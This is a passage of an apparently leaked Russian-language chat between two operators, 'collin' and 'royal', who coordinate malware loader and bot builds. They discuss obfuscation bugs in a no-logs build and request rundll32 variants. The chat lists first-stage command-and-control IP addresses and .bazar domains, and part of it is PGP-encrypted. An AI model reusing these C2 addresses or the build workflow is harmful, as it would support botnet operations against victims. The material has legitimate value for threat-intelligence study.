SoWDQ2LJG8YBzEMOEkbfISHAqjZM+PdAIcuvPcnNk1quqvT724FK0KHZ/eZs2Nfw
8TxqIObeRzvLp6ESEPIAhQg09rYNlEkwAn8u9GfS8O88d0ihKzW0Y9QRZuhCyMZE
1WV7gAu7vYl/dU1s1CTqvM9OVDQ+XZ1mTTSipswb+fNouDnQyqd2MwVH2OepXhRh
8f49X5RKp4md4twR5zWlQjue6LTkS9yQnd5ptRLYZRD/a9fTscNmno/OQqwjZQ9V
QQrD4ie/HKVc2RdkuEUip03s3t/Y10w8xvapwVVcaZlCwVsD+JW+G7ekqvjs+GEc
qgO/+yRsxp8+640/F/AYpIDVqUDhfvJg8VpMDqTcQTKTJJceGF1uK6r1FpJLjtba
8rG9RP586nnXUjwSElVQZSIP62I+GNTraADbbzZyDNvrH5CCa/GAzN+nveyzk+bS
wCEBbGP4NK2WAY+mPLvI+syK1Ad6C+7S2xaLfuZq80knwFCcXUSOzKZxvfb0zgB2
ujCdGZqkJQYij7sK/K6wH9i/tgW3ISrT54L3tLR5MeEhTznRJL9xRpfnBi//A1Gz
7mhJ3Ot1+Lp8gLIKB/IwPrunaUHmfXYKKLw8kZGnEm0XklNHLx6IVJzYB4SPSnXl
IQRkKDC5MVY5iV2H3GBM96sltU6C1K+MeBz5nYfdsJEQNB/cjpau9W3hhGD0eLOv
8CV8Rd7WkjzJ5+N7swMT8FiCcxHKnw9h0SnVDd+yzTP1zf8=
=Q75Z
-----END PGP MESSAGE-----
[18.02.22 13:20:58] royal:		Может на opennic из-за того что эти адреса скомпрометированны подмена адреса.
[18.02.22 14:47:45] collin:		я прогнал твою сборку с заблокированными в брандмауере адресами 1го шага - с лоадером Release_Nologs два раза сделал - сервер не находит из базаров больше часа
[18.02.22 14:47:48] collin:		в логированном лоадере - все ок
[18.02.22 14:47:59] collin:		адреса из базаров работающие, мониторю
[18.02.22 14:48:04] collin:		что-то не так в нологс
[18.02.22 14:49:26] collin:		и я помню такая ситуация уже была осенью, почему то опять к этому вернулись
[18.02.22 14:50:54] collin:		таск 582 есть, у тебя давно уже исполненый стоит
[18.02.22 14:51:01] collin:		почему поведение в логгированной и нологс опять расходитсяя?
[18.02.22 15:02:24] royal:		Компилятор может чудить.
[18.02.22 15:02:31] royal:		При обфускации.
[18.02.22 15:07:27] collin:		добавил таск 873, надо срочно поправить
[18.02.22 15:22:24] royal:		Я ушел.
[21.02.22 07:42:21] collin:		привет!
[21.02.22 07:42:26] collin:		сделай сборки:
[21.02.22 07:42:33] collin:		16 generic
16 rundll32(smvdata)
[21.02.22 07:42:43] collin:		```
адреса (домены) первого этапа
бот:
185.150.117.116
172.96.188.72
45.131.66.226
23.160.193.137

лоадер:
45.131.66.226
23.160.193.137
185.150.117.116
172.96.188.72

домены второго этапа, бот и лоадер:
(нет)
```
[21.02.22 07:42:46] collin:		направь odis
[21.02.22 09:56:47] royal:		Там адреса есть какие нибудь получаемые из bazar?
[21.02.22 09:56:54] royal:		Что то не резолвится ничего.
[21.02.22 09:57:25] collin:		```
45.41.204.147
A=211.215.50.109
dns:piynxyek.bazar
dns:ofefekif.bazar
dns:xeebxyus.bazar

194.40.243.169
A=60.214.13.87
dns:oqsyifek.bazar
dns:albousif.bazar
dns:zeicifus.bazar

188.127.227.60
A=66.129.29.194
dns:vuniekek.bazar
dns:ytvixyif.bazar
dns:zebeekus.bazar

5.2.75.193
A=251.252.181.63
dns:eksousek.bazar
dns:kauvifif.bazar
dns:nogousus.bazar
```
[21.02.22 09:57:37] collin:		вот эти актуальны
[21.02.22 15:23:59] royal:		Смотрю админка уже меня не пускает. Получается завтра уже можно не появляться?
[21.02.22 15:24:31] collin:		-----BEGIN PGP MESSAGE-----

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
qKW8jWJSsp6LXhGJCA==
=XMBX
-----END PGP MESSAGE-----
[21.02.22 15:24:36] collin:		подтверди получение
[21.02.22 15:25:32] royal:		Принял.
